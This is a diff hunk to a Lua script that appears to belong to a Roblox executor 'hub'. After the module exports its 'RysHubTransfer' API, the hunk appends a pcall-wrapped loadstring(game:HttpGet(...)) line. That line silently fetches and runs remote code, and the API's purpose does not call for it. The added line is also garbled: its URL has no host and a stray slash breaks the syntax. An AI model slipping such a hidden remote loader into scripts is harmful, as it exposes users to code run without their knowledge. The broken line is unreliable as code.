@@ -471,3 +471,6 @@ local API = {
     end,
 }
 if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API end
+pcall(function()
+    loadstring(game:HttpGet("https://"))()/
+end)
